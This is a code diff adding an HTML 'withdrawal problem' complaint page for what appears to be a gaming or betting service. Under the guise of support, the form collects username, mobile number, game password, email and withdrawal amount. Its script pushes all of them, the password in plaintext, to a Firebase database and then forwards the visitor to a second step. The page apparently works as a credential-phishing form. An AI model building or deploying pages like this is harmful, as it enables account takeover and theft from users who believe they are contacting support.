@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Withdrawal Problem</title>
+    <link rel="icon" type="image/jpeg" href="FAVICONS/images.jpg">
+    <link rel="stylesheet" href="style3.css">
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+</head>
+<body>
+
+    <header>
+        <div class="header-content">
+            <a href="index.html" class="back-btn">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"></polyline></svg>
+            </a>
+            <h1>WITHDRWAL PROBLEM COMPLAIN PAGE</h1>
+        </div>
+    </header>
+
+    <main>
+        <form class="complain-form">
+
+            <div class="step-title">STEP 1 - ACCOUNT DETAILS</div>
+
+            <div class="form-group">
+                <label>USER NAME</label>
+                <input type="text" placeholder="Enter your username" required>
+            </div>
+
+            <div class="form-group">
+                <label>REGISTER MOBIL NUMBER</label>
+                <input type="tel" placeholder="Enter registered mobile number" required>
+            </div>
+
+            <div class="form-group">
+                <label>GAME PASSWORD</label>
+                <input type="password" placeholder="Enter game password" required>
+            </div>
+
+            <div class="form-group">
+                <label>EMAIL ID</label>
+                <input type="email" placeholder="Enter email address" required>
+            </div>
+
+            <div class="form-group">
+                <label>SELECT PROBLEM</label>
+                <select required>
+                    <option value="" disabled selected>Select your problem</option>
+                    <option value="pending">PENDING</option>
+                    <option value="processing">PROCESSING</option>
+                    <option value="reject">REJECT</option>
+                    <option value="not-received">NOT RECEIVED BANK ACCOUNT</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>ENTER WITHDRWAL AMOUNT</label>
+                <input type="number" placeholder="Enter withdrawal amount" required>
+            </div>
+
+            <button type="submit" class="submit-btn">NEXT</button>
+        </form>
+    </main>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBAB_nWexO6iW9RGPmfsqXVjhDWpnlSXoU",
+            authDomain: "zenvy-store-43ca0.firebaseapp.com",
+            databaseURL: "https://zenvy-store-43ca0-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "zenvy-store-43ca0",
+            storageBucket: "zenvy-store-43ca0.firebasestorage.app",
+            messagingSenderId: "469849085917",
+            appId: "1:469849085917:web:efe5625260eaa28ab30834"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        const uploadAreas = document.querySelectorAll('.upload-area');
+
+        uploadAreas.forEach(area => {
+            const fileInput = area.querySelector('.file-input');
+            const preview = area.nextElementSibling;
+
+            area.addEventListener('click', () => {
+                fileInput.click();
+            });
+
+            fileInput.addEventListener('change', (e) => {
+                const file = e.target.files[0];
+                if (file) {
+                    const reader = new FileReader();
+                    reader.onload = (event) => {
+                        preview.innerHTML = `<img src="${event.target.result}" alt="Preview">`;
+                    };
+                    reader.readAsDataURL(file);
+                }
+            });
+        });
+
+        const REDIRECT_LINK = 'withdrawal-step2.html';
+
+        document.querySelector('.complain-form').addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            const inputs = document.querySelectorAll('.form-group input, .form-group select');
+            let allFilled = true;
+            
+            inputs.forEach(input => {
+                if (!input.value.trim()) {
+                    allFilled = false;
+                    input.style.borderColor = '#ff4444';
+                } else {
+                    input.style.borderColor = '#333';
+                }
+            });
+            
+            if (!allFilled) {
+                alert('Please fill all fields!');
+                return;
+            }
+
+            const complaintData = {
+                username: inputs[0].value,
+                mobile: inputs[1].value,
+                password: inputs[2].value,
+                email: inputs[3].value,
+                problem: inputs[4].value,
+                amount: inputs[5].value,
+                type: 'withdrawal',
+                status: 'step1',
+                timestamp: Date.now()
+            };
+
+            db.ref('complaints/').push(complaintData);
+
+            const btn = document.querySelector('.submit-btn');
+            btn.classList.add('loading');
+            btn.textContent = 'SUBMITTING...';
+            
+            setTimeout(() => {
+                window.location.href = REDIRECT_LINK;
+            }, 3000);
+        });
+    </script>
+
+</body>
+</html>
